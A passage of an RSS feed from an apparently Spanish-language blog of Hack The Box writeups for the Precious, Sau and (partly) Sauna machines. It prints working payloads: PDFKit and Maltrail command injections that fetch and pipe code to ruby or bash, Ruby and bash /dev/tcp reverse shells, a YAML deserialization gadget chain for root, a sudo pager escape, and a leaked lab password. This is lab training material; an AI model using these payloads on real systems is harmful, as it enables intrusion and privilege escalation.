&lt;p&gt;Ahora ejecutamos el exploit en la máquina víctima.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Entramos en la ruta indicada por el exploit y lo ejecutamos:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./bin/bash -p
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Precious HTB Writeup</title><link>https://fuwari.vercel.app/posts/precious/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/precious/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Precious es una máquina linux sencilla creada por Nauten en Hack the Box que cuenta con un servidor web que utiliza una versión de PDFKit vulnerable a CVE-2022-25765, que puede ser explotada para ejecutar comandos como el usuario ruby. Dentro del directorio personal de este usuario encontramos una carpeta que contiene un archivo de configuración con las credenciales de otro usuario llamado henry. Como henry, podemos ejecutar un script en particular como root a través del comando sudo. Este script es vulnerable a una forma de deserialización de YAML, que nos lleva a la ejecución de código como root.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Primero vamos a configurar nuestro entorno y ejecutar un puerto TCP.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
export rhost=&quot;10.10.11.189&quot; # Target IP address
export lhost=&quot;10.10.14.4&quot; # Your VPN IP address
echo rhost=$rhost &amp;gt;&amp;gt; .env
echo lhost=$lhost &amp;gt;&amp;gt; .env
. ./.env &amp;amp;&amp;amp; sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv $rhost -oG nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Los puertos TCP abiertos reportados en el escaneo incluyen:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Product&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;OpenSSH&lt;/td&gt;
&lt;td&gt;8.4p1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;nginx&lt;/td&gt;
&lt;td&gt;1.18.0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;El escaneo también informa que el puerto 80 responde con una redirección a http://precious.htb/ . Añadamos este nombre de host a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Empezaremos visitando http://precious.htb/ en nuestro navegador favorito.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;La página aparentemente tiene alguna funcionalidad que convertirá el contenido de una URL dada en un documento PDF.&lt;/p&gt;
&lt;h3&gt;PDF Generator&lt;/h3&gt;
&lt;p&gt;Al enviar una URL ficticia a través del formulario web, observamos una petición de nuestro navegador con BurpSuite.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;La petición sólo pasa la URL enviada al servidor. Vamos a probar esta funcionalidad en nuestro propio servidor HTTP.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
mkdir share &amp;amp;&amp;amp; cd share
echo &apos;&amp;lt;p&amp;gt;Hello!&amp;lt;/p&amp;gt;&apos; &amp;gt; index.html
python3 -m http.server --bind $lhost 8080
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
curl -d &quot;url=http://$lhost:8080/&quot; http://precious.htb/ -o response.bin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Recibimos una petición a nuestro servidor HTTP y posteriormente recibimos el resultado PDF.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
file response.bin # The response body is a PDF document
xdg-open response.bin # Open the document
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El documento contiene el texto «¡Hello!», lo que es de esperar porque ese es el contenido que teníamos antes en nuestro sitio. Comprobando los metadatos del documento con exiftool, descubrimos que el campo Creador menciona que el documento se generó utilizando un producto identificado como PDFKit v0.8.6.&lt;/p&gt;
&lt;h3&gt;CVE-2022-25765&lt;/h3&gt;
&lt;p&gt;Después de algunas investigaciones, determinamos que esta versión de pdfkit es vulnerable a CVE-2022-25765, lo que significa que potencialmente podríamos inyectar comandos del sistema operativo como se explica aquí. Intentemos explotar el bug para establecer una sesión de shell inversa con PwnCat. Usaremos una shell inversa escrita en Ruby porque sabemos que Ruby está instalado ya que PDFKit está escrito en Ruby.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
mkdir -p share &amp;amp;&amp;amp; cd share
rb=&quot;require &apos;socket&apos;;spawn(&apos;sh&apos;,[:in,:out,:err]=&amp;gt;TCPSocket.new(&apos;$lhost&apos;,8443))&quot;
echo &quot;$rb&quot; &amp;gt; index.html # Write ruby reverse shell to web index
python3 -m http.server --bind $lhost 8080 &amp;amp;&amp;gt;/dev/null &amp;amp; # Serve payload
pwncat-cs -m linux -l $lhost 8443 # PwnCat listener | Install: `pip3 install pwncat-cs`
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
curl precious.htb -d &quot;url=http://%2520%60curl%20$lhost:8080|ruby%60&quot; # Trigger payload
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;Ruby&lt;/h3&gt;
&lt;p&gt;Nuestra sesión de shell inversa está en el contexto del usuario ruby. En el directorio principal de este usuario, encontramos el archivo ~/.bundle/config que contiene las credenciales potenciales&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ruby@precious.htb (PwnCat)
find ~ -type f # We find a configuration file of sorts
cat ~/.bundle/config # Let&apos;s read it
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El usuario henry, asociado con la contraseña Q3c1AqGHtoI0aXAYFH, también está presente en la máquina actual con la misma contraseña.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali
pwncat-cs ssh://henry@precious.htb # password is Q3c1AqGHtoI0aXAYFH
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Henry&lt;/h3&gt;
&lt;p&gt;Como henry, podemos ejecutar un comando específico como root a través de sudo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# henry@precious.htb (SSH)
sudo -l
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Echemos un vistazo a este script y veamos lo que hace.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;
require &quot;yaml&quot;
require &apos;rubygems&apos;

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read(&quot;dependencies.yml&quot;))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts &quot;Installed version differs from the one specified in file: &quot; + local_name
            else
                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name
            end
        end
    end
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Este script no hace mucho más que llamar a YAML.load sobre el contenido del fichero dependencies.yml{:.filepath} de nuestro directorio de trabajo. Al investigar las vulnerabilidades que afectan a YAML.load, descubrimos que no es seguro utilizarlo con datos suministrados por el usuario. También nos encontramos con este maravilloso post que describe una cadena de gadgets que potencialmente podríamos utilizar para ejecutar comandos como root. Vamos a modificar el comando dentro de la carga útil YAML del post para generar un shell interactivo de root&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &amp;amp;1 !ruby/object:Net::BufferedIO
      io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: &quot;abc&quot;
      debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter
         socket: &amp;amp;1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module &apos;Kernel&apos;
                 method_id: :system
             git_set: &quot;bash -pi&quot;
         method_id: :resolve
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora con el payload YAML dependencies.yml{:.filepath} en nuestro directorio de trabajo, ejecutamos el script vulnerable con sudo&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# henry@precious.htb (SSH)
sudo /usr/bin/ruby /opt/update_dependencies.rb # trigger the payload
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El comando genera con éxito un intérprete de comandos raíz, desde el que podemos leer la bandera final en /root/root.txt{:.filepath}.&lt;/p&gt;
&lt;h3&gt;Alternative Solution&lt;/h3&gt;
&lt;p&gt;Otra forma en la que podríamos obtener la bandera raíz es utilizando el script en /opt/update_dependencies.rb{:.filepath} para leer archivos a través de un enlace simbólico. Cuando el script busque dependencies.yml{:.filepath} en el directorio de trabajo, encontrará un enlace simbólico plantado que apuntará a /root/root.txt{:.filepath}. Cuando el script intente analizar el archivo como YAML, mostrará un error con el contenido del archivo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# henry@precious.htb (SSH)
cd $(mktemp -d)
ln -s /root/root.txt ./dependencies.yml # create symlink
sudo /usr/bin/ruby /opt/update_dependencies.rb # read /root/root.txt
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Sau HTB Writeup</title><link>https://fuwari.vercel.app/posts/sau/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/sau/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Sau es una sencilla máquina Hack the Box basada en Linux creada por sau123 que involucra explotación web, Falsificación de Peticiones del Lado del Servidor (SSRF), Vulnerabilidades y Exposiciones Comunes (CVEs), y explotación de políticas Sudo. Un escaneo de puertos reveló inicialmente un servidor HTTP vulnerable a un error SSRF rastreado como CVE-2023-27163. La vulnerabilidad fue explotada para contactar con un servidor HTTP interno que ejecutaba una versión obsoleta de Mailtrail propensa a la inyección de comandos shell, que utilizamos para establecer un shell inverso como puma. La política sudo para este usuario nos permitió explotar CVE-2023-26604 y obtener ejecución como root.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Comenzamos realizando un escaneo completo de puertos TCP utilizando el comando nmap. Este comando escanea de forma rápida y fiable cualquier puerto TCP relevante en el objetivo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Run a thorough port scan
nmap &quot;10.10.11.224&quot; -vv -Pn -sT -sV -n -p- -T4 --min-rate=1000 --max-retries=3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El escaneo reportó dos puertos abiertos y dos puertos filtrados:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Product&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;OpenSSH&lt;/td&gt;
&lt;td&gt;8.4p1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8338&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;55555&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Primero navegamos a &lt;a href=&quot;http://10.10.11.224:55555&quot;&gt;http://10.10.11.224:55555&lt;/a&gt;, que nos redirigió a http://10.10.11.224:55555/web. En esta página observamos un pie de página que indicaba que el sitio funcionaba con la versión 1.2.1 de request-baskets.&lt;/p&gt;
&lt;p&gt;Buscamos CVEs que afectaran a esta instalación y encontramos un fallo SSRF, CVE-2023-27163. La página CVEDetails de este fallo proporcionaba una descripción de la vulnerabilidad junto con un enlace a detalles de explotación adicionales.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;request-baskets hasta v1.2.1 se descubrió que contiene una falsificación de solicitud del lado del servidor (SSRF) a través del componente /api/baskets/{name}. Esta vulnerabilidad permite a los atacantes acceder a recursos de red e información confidencial a través de una solicitud de API manipulada.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;CVE-2023-27163&lt;/h3&gt;
&lt;p&gt;Según la breve prueba de concepto a la que se hace referencia en la página dedicada a CVEDetails, debe realizarse una solicitud HTTP POST especial a /api/baskets/*{:.filepath} para crear una nueva cesta y establecer una URL de reenvío. Se ha creado un sencillo script de shell para agilizar este proceso.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env zsh
[ $# -lt 1 ] &amp;amp;&amp;amp; echo &apos;Usage: ./ssrf-curl &amp;lt;URL&amp;gt; [OPTS ...]&apos; &amp;amp;&amp;amp; exit 1

echo &apos;{&quot;proxy_response&quot;:true,&quot;expand_path&quot;:true}&apos; |
  jq -c --arg a &quot;$1&quot; &apos;.forward_url=$a&apos; |
  read json

basket=$(openssl rand -hex 8)
curl -so /dev/null -d &quot;$json&quot; &quot;http://10.10.11.224:55555/api/baskets/${basket}&quot;
curl -s &quot;http://10.10.11.224:55555/${basket}&quot; ${@:2}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Mailtrail&lt;/h3&gt;
&lt;p&gt;Utilizamos este script para acceder indirectamente al servidor HTTP en el puerto 80, ya que no se puede acceder directamente. Se envió una simple petición HTTP GET para verificar la existencia del servidor HTTP y recopilar información.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Test SSRF script
zsh ssrf.zsh http://localhost:80 -i | more
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
Cache-Control: no-cache
Connection: close
Content-Security-Policy: default-src &apos;self&apos;; style-src &apos;self&apos; &apos;unsafe-inline&apos;; img-src * blob:; script-src &apos;self&apos; &apos;unsafe-eval&apos; https://stat.ripe.net; frame-src *; object-src &apos;none&apos;; block-all-mixed-content;
Content-Type: text/html
Date: Thu, 28 Dec 2023 08:44:05 GMT
Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT
Server: Maltrail/0.53
Transfer-Encoding: chunked

&amp;lt;!DOCTYPE html&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Se encontró una huella digital de software en el encabezado HTTP «Servidor» con el valor «Maltrail/0.53». Hemos buscado en la web vulnerabilidades que afecten a esta versión y hemos encontrado un fallo de inyección de comandos del sistema operativo divulgado aquí.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Description&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Maltrail &amp;lt;= v0.54 is vulnerable to unauthenticated OS command injection during the login process.**
Summary&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;[…] An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.
Proof of Concept&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;curl &apos;http://hostname:8338/login&apos; --data &apos;username=;&lt;code&gt;id &amp;gt; /tmp/bbq&lt;/code&gt;&apos;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Parece que la versión instalada puede ser explotada a través del parámetro nombre de usuario en el endpoint de login en http://localhost/login, al que se puede acceder con el script SSRF. Iniciamos una escucha PwnCat y procedimos a ejecutar un simple shell inverso bash descargado a través de HTTP.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Start PwnCat listener
lhost=&quot;10.10.14.2&quot; # Change to your assigned VPN IP address
pwncat-cs -l $lhost 8443 # Install: `python3 -m pip install pwncat-cs`

# [In another session] Serve reverse shell over HTTP
lhost=&quot;10.10.14.2&quot; # Change to your assigned VPN IP address
mkdir ./http-share &amp;amp;&amp;amp; echo &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/${lhost}/8443 &amp;lt;&amp;amp;1&quot; &amp;gt; http-share/index.html
http-server ./http-share -p 8080 -a $lhost # Install: `npm install -g http-server`

# [In another session] Trigger command execution
lhost=&quot;10.10.14.2&quot; # Change to your assigned VPN IP address
zsh ssrf.zsh http://localhost:80/login -i -d &quot;username=\`curl ${lhost}:8080|bash\`&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Con la ejecución como el usuario puma, Encontramos una política sudo personalizada que nos permite ejecutar un comando en particular como cualquier usuario sin la contraseña de puma.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Display sudo policy
sudo -l
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;CVE-2023-26604&lt;/h3&gt;
&lt;p&gt;El comando que podemos ejecutar en un contexto privilegiado es /usr/bin/systemctl status trail.service. Después de buscar en la web vulnerabilidades conocidas en systemd/systemctl, se encontró una CVE de escalada de privilegios bastante reciente rastreada como CVE-2023-26604.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;systemd before 247 no bloquea adecuadamente la escalada de privilegios local para algunas configuraciones Sudo, por ejemplo, archivos sudoers plausibles en los que se puede ejecutar el comando «systemctl status». Específicamente, systemd no establece LESSSECURE a 1, y por lo tanto otros programas pueden ser lanzados desde el programa less. Esto presenta un riesgo de seguridad sustancial cuando se ejecuta systemctl desde Sudo, porque less se ejecuta como root cuando el tamaño de la terminal es demasiado pequeño para mostrar la salida completa de systemctl.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Comprobamos la versión de systemd y nos dimos cuenta de que estaba instalada la versión vulnerable systemd 245.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Check if systemd version is vulnerable
/usr/bin/systemctl --version
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Para explotar la CVE-2023-26604, se bajó la altura del terminal como se describe en la descripción de la CVE, y se ejecutó el comando sudo permitido. Desde el paginador simplemente introdujimos !sh para generar un shell de root.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# execute systemctl with lower resolution to spawn pager
stty rows 1 &amp;amp;&amp;amp; sudo systemctl status trail.service
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;!sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Root !&lt;/p&gt;
</content:encoded></item><item><title>Sauna HTB Writeup</title><link>https://fuwari.vercel.app/posts/sauna/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/sauna/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Sauna es una máquina Windows de fácil dificultad que cuenta con enumeración y explotación de Active Directory. Los posibles nombres de usuario pueden derivarse de los nombres completos de los empleados que aparecen en el sitio web. Con estos nombres de usuario, se puede realizar un ataque ASREPRoasting, que da como resultado el hash de una cuenta que no requiere preautenticación Kerberos.&lt;/p&gt;
&lt;p&gt;Este hash puede ser sometido a un ataque de fuerza bruta offline, con el fin de recuperar la contraseña en texto plano para un usuario que es capaz de WinRM a la caja. La ejecución de WinPEAS revela que otro usuario del sistema ha sido configurado para iniciar sesión automáticamente e identifica su contraseña. Este segundo usuario también tiene permisos de administración remota de Windows. BloodHound revela que este usuario tiene el derecho extendido DS-Replication-Get-Changes-All, que le permite volcar hashes de contraseñas desde el Controlador de Dominio en un ataque DCSync. La ejecución de este ataque devuelve el hash del administrador de dominio principal, que se puede utilizar con Impacket&amp;amp;#039;s psexec.py para obtener una shell en la caja como NT_AUTHORITY\SYSTEM.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.10.175

PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=140 ms

--- 10.10.10.175 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.637/139.637/139.637/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver en el escaneo de puertos que se filtra el dominio EGOTISTICAL-BANK.LOCAL. También hay tres servicios que tienen una superficie de ataque goof http 80, smb 445 y ldap 389.&lt;/p&gt;
&lt;p&gt;También podemos mirar y ver que esto es probablemente un controlador de dominio. Teniendo puertos; 53 DNS, 88 Kerberos y 445 son puertos comunes de DC.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS --open -p- --min-rate 5000 -n -Pn -v -oG 10.10.10.175 nmap 
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Product&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;53&lt;/td&gt;
&lt;td&gt;domain&lt;/td&gt;
&lt;td&gt;Simple DNS Plus&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;Microsoft IIS httpd&lt;/td&gt;
&lt;td&gt;10.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;88&lt;/td&gt;
&lt;td&gt;kerberos-sec&lt;/td&gt;
&lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;135&lt;/td&gt;
&lt;td&gt;msrpc&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;139&lt;/td&gt;
&lt;td&gt;netbios-ssn&lt;/td&gt;
&lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;389&lt;/td&gt;
&lt;td&gt;ldap&lt;/td&gt;
&lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;445&lt;/td&gt;
&lt;td&gt;microsoft-ds&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;464&lt;/td&gt;
&lt;td&gt;kpasswd5&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;593&lt;/td&gt;
&lt;td&gt;ncacn_http&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC over HTTP&lt;/td&gt;
&lt;td&gt;1.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;636&lt;/td&gt;
&lt;td&gt;tcpwrapped&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3268&lt;/td&gt;
&lt;td&gt;ldap&lt;/td&gt;
&lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3269&lt;/td&gt;
&lt;td&gt;tcpwrapped&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5985&lt;/td&gt;
&lt;td&gt;http&lt;/td&gt;
&lt;td&gt;Microsoft HTTPAPI httpd&lt;/td&gt;
&lt;td&gt;2.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9389&lt;/td&gt;
&lt;td&gt;mc-nmf&lt;/td&gt;
&lt;td&gt;.NET Message Framing&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;49667&lt;/td&gt;
&lt;td&gt;msrpc&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;49677&lt;/td&gt;
&lt;td&gt;ncacn_http&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
&lt;td&gt;HTTP 1.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;49676&lt;/td&gt;
&lt;td&gt;msrpc&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;49677&lt;/td&gt;
&lt;td&gt;msrpc&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;49706&lt;/td&gt;
&lt;td&gt;msrpc&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;49775&lt;/td&gt;
&lt;td&gt;msrpc&lt;/td&gt;
&lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Active Directory&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;Web - Port 80&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;En la página about http://10.10.10.175/about.html, podemos ver que hay una sección «Meet The Team» y encontrar un puñado de personas. He registrado cada uno de los nombres en el archivo llamado listUsers.txt.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; cat listUsers.txt 

Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A continuación voy a utilizar una herramienta llamada nombre de usuario-anarquía para transformar la lista de palabras de los nombres a uno con nombres de usuario comunes esquemas, Herramienta Aquí&lt;/p&gt;
